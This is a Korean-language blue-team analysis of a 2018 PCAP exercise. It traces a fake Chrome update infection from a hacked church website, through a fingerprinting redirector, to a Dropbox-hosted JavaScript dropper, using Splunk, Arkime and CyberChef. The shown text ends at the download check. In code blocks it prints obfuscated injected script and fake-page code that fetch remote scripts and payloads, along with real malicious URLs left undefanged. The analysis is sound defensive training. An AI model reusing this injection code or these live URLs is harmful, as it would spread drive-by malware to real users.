---
title: Sorting through the alerts — 해킹된 교회 사이트에서 가짜 Chrome 업데이트, WScript C2, 349 KB 페이로드, 실패한 후속 C2까지 (Splunk 중심, Arkime 보조)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - cyberchef
  - snort
  - socgholish
  - fake-update
  - c2
  - ticket
---

# Sorting through the alerts — 가짜 Chrome 업데이트에서 WScript C2와 후속 C2 시도까지 { #sorting-alerts }

!!! abstract "사례 요약"
    malware-traffic-analysis.net **2018-06-30 "Sorting through the alerts"**를 홈 랩 **pcapbox** VM에서 분석한 기록입니다. **주 도구는 Splunk(Zeek 로그)**이고, **Splunk로 볼 수 없는 것(페이지 내용, POST 본문)만 Arkime**로 봅니다. 윈도우 7 PC 한 대(**CONSERVATOR-PC, 사용자 lloyd.maxwell**)가 **해킹된 교회 웹사이트**를 엽니다. 사이트의 `.js` 파일 7개에 숨겨진 스크립트가 브라우저를 **리다이렉터(TDS)**를 거쳐 **가짜 "Update Chrome" 페이지**로 보내고, 그 페이지가 **Dropbox에서 `Chrome_72.3.22.js`**를 내려받게 합니다. 46초 뒤 사용자가 그 파일을 실행합니다. `wscript.exe`가 C2에 **XOR로 감춘 POST 3개**(호스트, 사용자, 도메인, 프로세스 목록)를 보내고 **349 KB 암호화 페이로드**를 받아 `%TEMP%`에서 `Chrome_72.3.22.exe`로 실행합니다. 그 뒤 페이로드가 **IP 주소만으로** C2 서버 두 곳에 약 7.5분마다 접속을 시도하지만, **한 곳은 거절하고 한 곳은 대답이 없습니다**. 간단한 Snort 룰 하나와 짧은 티켓으로 마무리합니다.

| | |
|---|---|
| **증거** | `2018-06-30-traffic-analysis-exercise.pcap` — 2018-06-30 20:27:15 – 20:59:06 UTC (31분 51초), 패킷 46,937개, SHA256 `902c9f31…ddb08e77` |
| **출처** | [malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts"](https://malware-traffic-analysis.net/2018/06/30/index.html) |
| **주어진 정보** | LAN 172.16.2.0/24, DC 172.16.2.9 (FabulousDuke-DC), 도메인 fabulousdukes.com |
| **환경** | 폐쇄망. pcapbox VM: Splunk(`index=zeek`, 필드 `pcap_case`), Arkime(태그 = 케이스 이름), Snort 2.9.20, CyberChef |
| **결과물** | 분석, 풀어 낸 리다이렉트·다운로드 URL과 C2 본문, Snort 룰 하나, 침해사고 티켓(txt) |
| **관련 페이지** | [Night Dew 두 번째 분석(pcapbox, Arkime + Splunk)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [SPL 치트시트](../splunk/spl-cheatsheet.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Zeek 로그](../../network/zeek/index.md) · [비콘과 C2](../../network/beaconing-c2.md) |

!!! tip "이 페이지 읽는 법"
    단계마다 같은 순서예요. **목적 → Splunk → Arkime(Splunk로 안 보일 때만) → 결과 → 결과 읽기 → 티켓 기록**. SPL 쿼리는 모두 한 줄씩 설명합니다. **질문** 상자는 분석하면서 나오는 질문과 답이에요.

    Splunk에는 Zeek의 **요약**(누가, 언제, 얼마나 크게, 어떤 이름)이 들어 있어요. Zeek는 **페이지 본문과 POST 본문을 저장하지 않아요**. 그래서 답이 트래픽 *안*에 있을 때는 그 한 번만 Arkime로 가서 보고 다시 Splunk로 돌아옵니다.

    결과 블록은 같은 PCAP에서 만든 값이에요. Zeek가 재시도 연결을 나누는 방식 때문에 여러분 Splunk의 연결 개수가 한두 개 다를 수 있어요. 결론은 바뀌지 않습니다.

!!! warning "이 페이지의 지표는 실제 값입니다"
    도메인, IP, 해시는 2018년 실제 악성 트래픽에서 나온 값이에요. 본문과 표에서는 무력화(`hxxp`, `[.]`)했고, 코드 블록 안은 입력한 그대로 두었어요. **절대 접속하지 마세요.** 추출한 파일은 실행하지 마세요.

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| 감염된 PC | **172.16.2.169, CONSERVATOR-PC**, MAC `00:13:d4:1f:a2:5e`, 윈도우 7 x64 | 확인됨 |
| 사용자 | **lloyd.maxwell** (도메인 FABULOUSDUKES) | 확인됨 |
| 첫 악성 이벤트 | **20:27:53 UTC** — 해킹된 사이트 `www.stmarybahrain[.]com`(66.226.144.232) 방문 | 확인됨 |
| 리다이렉트 경로 | 숨겨진 스크립트 → `track.positiverefreshment[.]org/s_code.js`(185.244.149.74) → 가짜 페이지 `lw2e.sineadhollywoodnutt[.]com/topics/index.php`(93.95.100.178) | 확인됨 |
| 다운로드 | 20:28:01 `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` (HTTPS — 내용은 안 보임) | URL 확인(디코드), 다운로드는 TLS로 추정 |
| 실행 | 20:28:47 — `wscript.exe`가 `bb17eb22.login3.kimbrelelectric[.]com/blank.gif`(93.95.100.138)로 POST | 확인됨(본문 디코드) |
| 보낸 정보 | 스크립트 경로, 호스트 이름, 사용자, 도메인, 백신 이름, 프로세스 목록 | 확인됨 |
| 페이로드 | 349 KB 암호화된 응답 → `C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe` | 확인됨(스크립트가 직접 보고한 경로) |
| 후속 C2 | 46.105.131.66:443(거절), 107.170.231.118:4143(대답 없음), 끝날 때까지 약 7.5분마다 | 확인됨 — **C2 연결은 한 번도 성공하지 않음** |
| 악성코드 계열 | 가짜 업데이트 흐름 = **SocGholish(FakeUpdates)** 유형, 후속 동작은 **Dridex와 비슷함** | 확인 안 됨(해시 조회나 시그니처 없음) |
| 유출 / 내부 확산 | 정찰용 POST뿐. 다른 내부 호스트로 가는 트래픽 없음 | 확인됨 |

---

## 0단계 — PCAP 넣고 시계 확인하기 { #prep }

**목적:** PCAP에 **케이스 이름**을 붙여서 이전 실습 로그와 섞이지 않게 하고, 모든 도구가 **UTC**로 보이게 해요.

1. 파일 이름을 **`20180630_SORTING_ALERTS.pcap`**으로 바꾸고 `\\10.50.10.60\incoming`에 넣어요.
2. pcapbox에서 `tail -f /data/logs/ingest.log`를 보다가 `DONE case=20180630_SORTING_ALERTS`가 나오면 끝이에요. `START` 줄의 `sha256=`이 증거 해시예요.
3. Splunk **Preferences → Time zone = UTC**, Arkime **Settings → General → Timezone = UTC**, 시간 범위 **All**. (이유: [Night Dew 두 번째 분석 0-2](night-dew-arkime-splunk-netlogon-bruteforce.md#utc))

Splunk에 케이스가 들어왔는지 확인:

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek sourcetype=zeek:conn` — Zeek의 연결 로그예요(연결 하나 = 한 줄).
- `stats count by pcap_case` — 케이스 이름마다 줄 수를 세요(`pcap_case` = `.pcap`을 뺀 파일 이름).

```text
pcap_case                  count
20180511_NIGHT_DEW         216
20180630_SORTING_ALERTS    623
```

!!! note "`ts`와 `_time` 중 무엇을 쓰나요?"
    Zeek 자체의 시간은 **`ts`** 필드예요(1970년부터 센 초). pcapbox는 이 값을 Splunk의 `_time`에도 넣지만, 이 페이지의 쿼리는 모두 **`ts`로 정렬하고 출력**해요. 그러면 `_time`이 색인 시각으로 찍히는 Splunk에서도 맞게 나와요.

    `eval t=strftime(ts,"%H:%M:%S.%3N")`는 `1530390473.623`을 `20:27:53.623`으로 바꿔요(`%3N` = 밀리초).

---

## 1단계 — 큰 그림 { #overview }

**목적:** 캡처 시간, 내부 PC 개수, PC마다 얼마나 바쁜지 봐요.

### Splunk { #overview-splunk }

**쿼리 ① — 캡처 시간**

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS
| stats min(ts) as first max(ts) as last count as sessions
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- 1줄: 이 케이스만 봐요.
- 2줄: 요약 한 줄 — 가장 이른 `ts`, 가장 늦은 `ts`, 연결 개수.
- 3줄: epoch 초를 읽을 수 있는 날짜로 바꿔요.

```text
first                 last                  sessions
2018-06-30 20:27:15   2018-06-30 20:59:05   623
```

**쿼리 ② — 누가 연결을 시작하나**

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received by id_orig_h
| sort - sessions
```

- `id_orig_h` = 연결을 **시작한** IP예요.
- `dc(id_resp_h)` = 서로 다른 목적지 개수(**distinct count**)예요.
- `orig_bytes` / `resp_bytes` = 시작한 쪽이 보낸 바이트 / 상대가 보낸 바이트예요.
- `sort - sessions` = 많은 순서로 정렬해요.

```text
id_orig_h      sessions  destinations  sent      received
172.16.2.169   622       185           846554    34117200
172.16.2.9     1         1             62        0
```

### Arkime (빠른 교차 확인) { #overview-arkime }

```text
tags == 20180630_SORTING_ALERTS
```

SPIView → **General**도 같은 모습이에요. Src IP는 거의 다 `172.16.2.169`, Dst IP는 DC `172.16.2.9`가 가장 많고 그다음은 CDN·광고 주소가 많아요.

### 결과 읽기 { #overview-reading }

- **PC는 한 대예요.** 172.16.2.169가 모든 연결을 시작해요. 172.16.2.9(주어진 DC)는 NetBIOS 응답 하나만 보내요. 경보는 이 PC 때문이에요.
- **31분 동안 목적지 185곳** — 비콘에 필요한 것보다 훨씬 많아요. **사람이 웹을 보고 있다**는 뜻이에요(뉴스 사이트 하나가 광고·CDN 호스트를 수십 개 불러요). 악성 트래픽은 그 사이에 숨은 몇 줄이라서 "가장 많이 통신한 곳"으로는 못 찾아요. 그래서 **HTTP**를 읽어요(3단계).
- **34 MB 받음** — 대부분 웹 페이지와 (3단계에서 보듯) Chrome 구성 요소 업데이트예요.

**티켓 기록:** 없음. 베이스라인은 발견 사항이 아니에요.

---

## 2단계 — 172.16.2.169는 누구인가 { #identity }

**목적:** 티켓에 들어갈 호스트 이름, MAC, 사용자를 찾아요.

### 2-1. DHCP — 이번에는 비어 있어요 { #dhcp }

```spl
index=zeek sourcetype=zeek:dhcp pcap_case=20180630_SORTING_ALERTS
| table ts client_addr mac host_name
```

**결과: 한 줄도 없어요.**

!!! question "질문: DHCP에 아무것도 없으면 어떻게 하나요?"
    캡처가 시작될 때 PC가 이미 유효한 IP 임대를 갖고 있어서 다시 요청하지 않은 거예요. 윈도우가 자기 이름을 말하는 다른 곳을 봐요.

    - **Kerberos** — 로그온할 때 컴퓨터 계정(`이름$`)과 사용자.
    - **DNS** — 윈도우는 DC에 자기 이름을 등록해요(`<이름>.<도메인>`에 대한 `SOA` 질의 = 동적 DNS 업데이트).
    - **NetBIOS 브라우저 알림**(브로드캐스트로 가는 UDP 138) — Zeek는 기록하지 않고 Arkime는 보여 줘요.
    - **MAC** — Zeek `conn.log`는 그 옵션을 켰을 때만 `orig_l2_addr`가 있어요. Arkime는 세션마다 MAC을 항상 보여 줘요.

### 2-2. Kerberos { #kerberos }

```spl
index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| sort ts
| table t id_orig_h request_type client service success error_msg
```

- `request_type`: **AS** = 로그온(TGT 요청), **TGS** = 서비스용 티켓 요청.
- `client` = `계정/영역(REALM)`. 이름이 **`$`**로 끝나면 **컴퓨터**, `$`가 없으면 **사람**이에요.
- `service` = 티켓의 용도(`krbtgt/...` = 로그온 티켓 자체, `cifs/` = 파일 공유, `ldap/` = 디렉터리).
- `error_msg` = 요청이 실패한 이유.

```text
t         id_orig_h     request_type  client                              service                                   success  error_msg
20:27:17  172.16.2.169  AS            conservator-pc$/FABULOUSDUKES.COM   krbtgt/FABULOUSDUKES.COM                  false    KDC_ERR_PREAUTH_REQUIRED
20:27:17  172.16.2.169  AS            conservator-pc$/FABULOUSDUKES.COM   krbtgt/FABULOUSDUKES.COM                  true     -
20:27:17  172.16.2.169  TGS           CONSERVATOR-PC$/FABULOUSDUKES.COM   ldap/FabulousDuke-DC.fabulousdukes.com/…  true     -
...
20:27:18  172.16.2.169  AS            lloyd.maxwell/FABULOUSDUKES         krbtgt/FABULOUSDUKES                      false    KDC_ERR_PREAUTH_REQUIRED
20:27:18  172.16.2.169  AS            lloyd.maxwell/FABULOUSDUKES         krbtgt/FABULOUSDUKES                      true     -
20:27:18  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     host/conservator-pc.fabulousdukes.com     true     -
20:27:35  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     LDAP/FabulousDuke-DC.fabulousdukes.com/…  true     -
20:27:36  172.16.2.169  TGS           lloyd.maxwell/FABULOUSDUKES.COM     cifs/fabulousduke-dc.fabulousdukes.com    true     -
...
```

- 계정마다 첫 AS는 **`KDC_ERR_PREAUTH_REQUIRED`**로 실패하고 다음 AS는 성공해요. 정상적인 **사전 인증** 과정이지, 비밀번호가 틀린 게 아니에요.
- 줄마다 이름의 대소문자가 달라요(`conservator-pc$` / `CONSERVATOR-PC$`). 윈도우가 일정하지 않을 뿐 같은 계정이에요.
- PC는 20:27:17에, **lloyd.maxwell**은 20:27:18에 로그온해요. 캡처가 로그온 직후부터 시작돼요.

### 2-3. DNS 동적 업데이트 { #dns-name }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS qtype_name=SOA
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h query qtype_name rcode_name
```

- `qtype_name=SOA` — "이 영역의 주인은 누구?"라는 질의만 봐요. 윈도우는 자기 DNS 기록을 고치기 전에 이 질의를 보내요.

```text
t         id_orig_h      id_resp_h    query                               qtype_name  rcode_name
20:27:16  172.16.2.169   172.16.2.9   Conservator-PC.fabulousdukes.com    SOA         NOERROR
20:27:16  172.16.2.169   172.16.2.9   fabulousdukes.com                   SOA         NOERROR
20:37:03  172.16.2.169   172.16.2.9   Conservator-PC.fabulousdukes.com    SOA         NOERROR
20:37:03  172.16.2.169   172.16.2.9   fabulousdukes.com                   SOA         NOERROR
```

### 2-4. Arkime: MAC과 NetBIOS 이름 { #arkime-mac }

```text
tags == 20180630_SORTING_ALERTS && ip.src == 172.16.2.169 && port.dst == 138
```

세션을 펼치면 **Src MAC `00:13:d4:1f:a2:5e`**가 보이고, 내용에 `\MAILSLOT\BROWSE ... CONSERVATOR-PC`가 있어요(PC가 네트워크에 자기를 알리는 메시지).

**결과 읽기:** IP 172.16.2.169, 호스트 **CONSERVATOR-PC**(Kerberos, DNS, NetBIOS가 모두 같음), MAC `00:13:d4:1f:a2:5e`, 사용자 **lloyd.maxwell**, 도메인 FABULOUSDUKES / fabulousdukes.com, DC 172.16.2.9.

**티켓 기록(호스트 정보만):**

```text
172.16.2.169 CONSERVATOR-PC (MAC 00:13:d4:1f:a2:5e) – user FABULOUSDUKES\lloyd.maxwell
```

---

## 3단계 — HTTP 먼저: 교회 웹사이트에서 가짜 Chrome 업데이트까지 { #http }

### 3-1. 호스트별 HTTP { #http-hosts }

**목적:** HTTP 요청 134개를 처음부터 하나씩 읽기는 많아요. **Host**별로 묶어서 모양을 먼저 봐요.

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(method) as methods values(user_agent) as user_agents by host
| sort first
```

- `host` — HTTP Host 헤더예요(pcapbox가 Splunk의 `host` 필드에 넣어 줘요).
- `values(method)` / `values(user_agent)` — 호스트마다 나온 서로 다른 값을 모두 보여 줘요.
- `sort first` — 호스트가 처음 나온 순서로 정렬해요.

```text
host                                   count  first     methods     user_agents
www.stmarybahrain.com                  52     20:27:53  GET         Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
track.positiverefreshment.org          3      20:27:55  GET         Mozilla/5.0 ... Chrome/67.0.3396.99 ...
lw2e.sineadhollywoodnutt.com           9      20:27:57  GET         Mozilla/5.0 ... Chrome/67.0.3396.99 ...
ocsp.digicert.com                      1      20:28:00  GET         Microsoft-CryptoAPI/6.1
bb17eb22.login3.kimbrelelectric.com    3      20:28:47  POST        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; ...)
redirector.gvt1.com                    32     20:33:54  HEAD GET    Microsoft BITS/7.5
r4---sn-p5qs7nek.gvt1.com              15     20:33:54  HEAD GET    Microsoft BITS/7.5
r4---sn-p5qs7nee.gvt1.com ... (gvt1.com 호스트 6개 더)  20:34–20:35  GET    Microsoft BITS/7.5
crl.microsoft.com                      2      20:43:13  GET         Microsoft-CryptoAPI/6.1
```

**결과 읽기 — 정상부터 지워요:**

- **`*.gvt1.com` + `Microsoft BITS/7.5`** — 구글 다운로드 서버예요. URI가 `/edgedl/release2/chrome_component/.../PepperFlashPlayer.crx3`예요. Chrome이 윈도우 BITS로 **Flash 구성 요소를 업데이트**하는 거예요. 정상이고, 34 MB의 대부분이 이거예요.
- **`ocsp.digicert.com`, `crl.microsoft.com`** — 윈도우의 인증서 확인(`Microsoft-CryptoAPI`)이에요. 정상이에요.

**남은 것을 시간 순서로 보면 모두 1분 안에 일어나요:**

1. `www.stmarybahrain[.]com` — 교회 웹사이트, 요청 52개(이미지와 스크립트가 있는 페이지 하나).
2. `track.positiverefreshment[.]org` — 2초 뒤. 상관없는 도메인에 "tracking" 같은 이름.
3. `lw2e.sineadhollywoodnutt[.]com` — 2초 뒤. 아무렇게나 만든 것 같은 하위 도메인.
4. `bb17eb22.login3.kimbrelelectric[.]com` — 50초 뒤, **POST만** 있고 **User-Agent가 달라요**.

1–3은 브라우저(Chrome 67)가 보냈어요. 4는 다른 프로그램이에요. 3단계는 1–3을, 4단계는 4를 풀어요.

!!! question "질문: PC가 cnn.com과 광고 서버 수십 곳도 열었는데 그것도 감염과 관련 있나요?"
    DNS를 보면 `www.cnn.com` 질의가 20:27:52.99로 교회 사이트보다 **1초 먼저**예요. 광고·CDN 이름은 그 페이지에서 나와요. 사용자가(또는 시작 탭이) CNN을 연 거예요. 모두 HTTPS이고 잘 알려진 서비스라서 잡음이에요. 판단 기준은 **Referer**예요(다음 단계). 광고 요청은 교회 사이트를 가리키지 않지만, 의심스러운 요청은 모두 교회 사이트를 가리켜요.

### 3-2. 누가 브라우저를 어디로 보냈나 — Referer 사슬 { #referer }

**목적:** 2와 3이 다른 탭이 아니라 교회 사이트**에서** 왔다는 것을 증명해요.

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com")
| eval t=strftime(ts,"%H:%M:%S.%3N")
| dedup host uri
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
| search NOT uri="*.jpg" NOT uri="*.gif" NOT uri="*.png" NOT uri="*.css"
```

- 1줄: `host IN (...)` — 세 호스트만 봐요.
- `dedup host uri` — 페이지마다 한 줄만 남겨요(반복 제거).
- `referrer` — Zeek가 **Referer** 헤더를 부르는 이름이에요. 이 요청을 부른 페이지예요.
- 마지막 줄: 이미지와 스타일 파일을 빼서 스크립트와 페이지가 잘 보이게 해요. `NOT` = 제외.

```text
t              host                            uri                                                     referrer                                    status  mime                    len
20:27:53.623   www.stmarybahrain.com           /                                                       -                                           200     text/html               ...
20:27:53.765   www.stmarybahrain.com           /new                                                    http://www.stmarybahrain.com/               301     text/html               ...
20:27:53.892   www.stmarybahrain.com           /new/                                                   http://www.stmarybahrain.com/               200     text/html               31295
20:27:54.637   www.stmarybahrain.com           /new/modules/mod_ariextmenu/mod_ariextmenu/js/ext-core.js  http://www.stmarybahrain.com/new/       200     text/plain              ...
20:27:54.749   www.stmarybahrain.com           /new/modules/mod_ariextmenu/mod_ariextmenu/js/menu.min.js  http://www.stmarybahrain.com/new/       200     text/plain              ...
...
20:27:55.731   track.positiverefreshment.org   /s_code.js?cid=220&v=24eca7c911f5e102e2ba              http://www.stmarybahrain.com/new/           200     text/plain              2761
20:27:56.081   track.positiverefreshment.org   /s_code.js?cid=220&v=77e997b1f7de3bc9b07d&rand=...&key=...&0=0&1=&2=16   http://www.stmarybahrain.com/new/   200   text/plain   4911
20:27:56.467   track.positiverefreshment.org   /s_code.js?cid=220&v=5f210213d05805d3ca4d&rand=...&0=Mozilla&1=Netscape&2=5.0 (Windows...   http://www.stmarybahrain.com/new/   200   text/plain   2329
20:27:57.029   lw2e.sineadhollywoodnutt.com    /topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240   http://www.stmarybahrain.com/new/   200   text/plain   4399
20:27:57.302   lw2e.sineadhollywoodnutt.com    /chromefiles/css.css                                    http://www.stmarybahrain.com/new/           200     text/plain              8304
```

**결과 읽기:**

- 이상한 두 호스트로 가는 요청은 모두 **Referer가 `http://www.stmarybahrain.com/new/`**예요. 교회 페이지가 직접 불렀어요. 사이트가 **해킹된** 거예요.
- 첫 `GET /`에는 **Referer가 없어요**. 사용자가 주소를 직접 쳤거나 즐겨찾기를 눌렀어요. 앞에 피싱 메일이나 검색 결과가 없어요.
- `s_code.js`를 **세 번** 요청하고, URL이 갈수록 길어져요. 세 번째에는 브라우저 이름, User-Agent 전체, 언어, 숫자가 잔뜩 들어 있어요(`&0=Mozilla&1=Netscape&2=5.0 (Windows...`). 이게 **브라우저 지문(fingerprint)**이에요. **TDS**(traffic distribution system, 트래픽 분배 시스템)라는 리다이렉터가 이 방문자를 감염시킬 가치가 있는지 판단하는 거예요. 윈도우면 통과, 안드로이드나 보안 연구자면 탈락.
- `cid=220`(TDS)와 `b=220`(가짜 페이지)이 **같은 숫자**예요. 같은 캠페인이에요.
- 가짜 페이지 경로는 `/topics/index.php`이고, 파일들이 **`/chromefiles/`**에 있어요(`chrome.min.css`, `chrome_logo_2x.png`, `chrome-new.jpg`). 구글이 아닌 도메인에서 Chrome처럼 꾸민 페이지예요.
- `resp_mime_types`는 Zeek가 **내용을 보고** 추측한 형식이에요. 자바스크립트가 `text/plain`으로 나오는 건 정상이에요(Zeek에 JS 전용 형식이 없어요).

### 3-3. 해킹된 사이트에 무엇이 심어졌나 (Arkime) { #injected }

Splunk로는 사이트가 TDS를 불렀다는 *사실*만 알 수 있어요. *어떻게* 불렀는지는 응답 본문 안에 있어서 안 보여요. Arkime에서 한 번 봐요.

```text
tags == 20180630_SORTING_ALERTS && host.http == www.stmarybahrain.com && http.uri == *menu.min.js*
```

- `host.http` — HTTP Host예요. `http.uri == *menu.min.js*` — URI에 `menu.min.js`가 들어 있는 것(`*` = 아무 글자).

세션을 펼치고 **응답**의 끝으로 내려가요. 진짜 메뉴 코드 뒤에 덧붙인 덩어리가 있어요.

```text
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];
if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){
var w=document.createElement('script');w.type='text/javascript';w.async=true;
w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');
...
```

문자열은 `b()` 함수의 간단한 방법으로 숨겨져 있어요. **두 글자마다 두 번째 글자만 남기고, 문자열을 거꾸로 뒤집어요.** CyberChef로 같은 일을 두 단계로 해요.

1. 따옴표 안의 글자(따옴표 빼고)를 **Input**에 붙여 넣어요.
2. **Find / Replace** — Find `(.)(.)` (종류 **Regex**), Replace `$2`, **Global match** 켜기. 글자 두 개마다 두 번째 글자만 남겨요.
3. **Reverse** (By Character).

| 숨긴 문자열 | 풀어 낸 값 |
|---|---|
| `st{n(e4g9A2r,exs,u8` | `userAgent` |
| `je,i{kaofo6c(` | `cookie` |
| `hs{w{o{d;n,i5W)` | `Windows` |
| `rd4i{ojr}d;n)A}` | `Android` |
| `:=ea)m,t3u{_,_4_5` | `___utma=` |
| `5a{b)28e;...p)tnt}h8` | `http://track.positiverefreshment.org/s_code.js?cid=220&v=24eca7c911f5e102e2ba` |

그래서 심어진 코드의 뜻은 이래요. **"브라우저가 윈도우이고 안드로이드가 아니며, 아직 `___utma=` 쿠키가 없으면(전에 온 적이 없으면) TDS 스크립트를 불러라."** 쿠키 확인 때문에 공격은 피해자마다 **한 번만** 보여요. 그래서 다시 재현하기 어려워요.

!!! note "문자열 길이가 홀수일 때"
    `(.)(.)`는 마지막 한 글자를 그대로 두고, **Reverse** 뒤에는 그 글자가 결과의 **맨 앞**에 와요(`yhttp://...`의 `y`). 무시하세요. `b()`도 그 글자는 버려요.

!!! question "질문: menu.min.js에만 있나요?"
    다른 스크립트도 같은 방법으로 확인하거나, Arkime에서 사이트의 js를 한 번에 찾아요.

    ```text
    tags == 20180630_SORTING_ALERTS && host.http == www.stmarybahrain.com && http.uri == *.js*
    ```

    하나씩 열어 보면 같은 덩어리가 **7개** 파일 끝에 붙어 있어요: `menu.min.js`, `ext-core.js`, `mootools.js`, `caption.js`, `jquery.js`, `s3Slider.js`, `md_stylechanger.js`. 공격자가 사이트 자체 파일을 고쳤어요. 사이트 주인은 모든 파일을 정리해야 하고, 티켓에는 "해킹된 사이트"로 적어요.

### 3-4. TDS 응답과 가짜 페이지 (Arkime + CyberChef) { #tds }

**목적:** 브라우저가 `s_code.js`에서 가짜 페이지로 어떻게 갔는지, 가짜 페이지가 무엇을 내려받게 했는지 찾아요.

**TDS 응답.** Arkime에서:

```text
tags == 20180630_SORTING_ALERTS && host.http == track.positiverefreshment.org
```

세션을 펼치면 요청/응답 쌍이 세 개 있어요. **세 번째 응답**(2,329 바이트)의 끝:

```text
var s=document.createElement('script');s.type='text/javascript';s.async=true;
s.src=getUrl('o0(4(2;0v4;7mch2,1)741)937gf)8}6,5d3{d{4y0)c)dy1{7y0{9)0;24a;888)=za;&s0(2(2;=ib}&;891(1}577{79=lsj?}p{h8p}.)x}e3d{n}i{/}sic}i}p{oqt5/,m3o;c{.(t6t(u{n)d)ono9w9y;l(l}o{h{d}a,e}n,i5s,.7ey26w(l)/,/):,p;t;t0hy');
```

같은 방법이고 함수 이름만 `getUrl`이에요. 같은 CyberChef 레시피로 풀면:

```text
http://lw2e.sineadhollywoodnutt.com/topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240
```

Splunk 목록의 바로 다음 URL(20:27:57.029)과 똑같아요. **TDS가 지문 검사를 통과시키고 가짜 페이지를 넘겨줬어요.**

**가짜 페이지.** Arkime에서:

```text
tags == 20180630_SORTING_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
```

응답은 HTML 페이지가 아니라 **교회 페이지를 그 자리에서 바꿔 쓰는 스크립트**예요(`document.head.innerHTML = ...`, `document.body.innerHTML = ...`). 안에 보이는 글자를 읽어요.

```text
<title>Update Chrome</title>
<h1 id="main-title">You are using an older version of Chrome</h1>
Update now to keep your Chrome browser running smoothly and securely.
Your download will begin automatically. If not, click here:
<a ... id="buttonDownload">Update Chrome</a>
```

끝부분:

```text
var fileUrl = getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,');
setTimeout(function() { window.location.href = fileUrl; }, 3000);
document.getElementById('buttonDownload').onclick = function() { window.location.href = fileUrl; return false; };
```

다시 CyberChef로:

```text
https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1
```

**결과 읽기:**

- 사용자 눈에는 교회 사이트가 **Chrome 업데이트 페이지**로 바뀌어요. **3초** 뒤(`setTimeout ... 3000`) 브라우저가 다운로드 링크를 스스로 열어요. 버튼을 눌러도 같아요.
- 파일은 **`Chrome_72.3.22.js`** — 설치 파일이 아니라 **자바스크립트 파일**이에요. 윈도우에서 `.js`를 더블클릭하면 브라우저 밖에서 **Windows Script Host(`wscript.exe`)**가 사용자 권한으로 실행해요.
- **Dropbox**에 올려져 있어요(`dl=1` = 미리보기가 아니라 다운로드). 믿을 만한 도메인이고 HTTPS라서 프록시와 필터를 통과하고, PCAP에서 파일 내용이 보이지 않아요.
- 2018년 6월 진짜 최신 버전은 Chrome **67**이었어요. "72.3.22"라는 버전은 없었어요. 사용자가 알아챌 수 있는 작은 단서예요.

!!! question "질문: 왜 이걸 SocGholish / FakeUpdates라고 부르나요?"
    연구자들이 이 캠페인에 붙인 이름이에요. **정상 사이트 해킹 → 지문 검사 TDS → 가짜 브라우저 업데이트 페이지 → 자바스크립트 파일 → PC 정보를 수집하고 두 번째 악성코드를 보내는 WScript C2**라는 흐름이에요. 지금까지 본 모든 부분이 이 흐름과 같아요. 그래도 **모양이 같다는 것**일 뿐이에요. 해시 조회나 벤더 시그니처가 없으니 티켓에는 "SocGholish 유형"이라고 적어요.

### 3-5. 다운로드가 실제로 일어났나 (Splunk) { #download }

**목적:** 다운로드가 HTTPS라서 `http.log`에 URL이나 파일이 없어요. 대신 DNS와 TLS에서 **서버 이름**을 찾아요.

```spl
index=zeek sourcetype=zeek:ssl pcap_case=20180630_SORTING_ALERTS server_name="*dropbox*"
| eval t=strftime(ts,"%H:%M:%S.%3N")
| table t id_resp_h id_resp_p server_name version established
```

- `zeek:ssl` — TLS 세션 하나당 한 줄이에요. `server_name`은 **SNI**예요. 암호화가 시작되기 전에 클라이언트가 평문으로 말하는 서버 이름이에요.
- `established` — TLS 핸드셰이크가 끝났는지 여부예요.

```text
t              id_resp_h     id_resp_p  server_name                                              version  established
20:28:00.427   162.125.6.1   443        www.dropbox.com                                          TLSv12   true
20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true
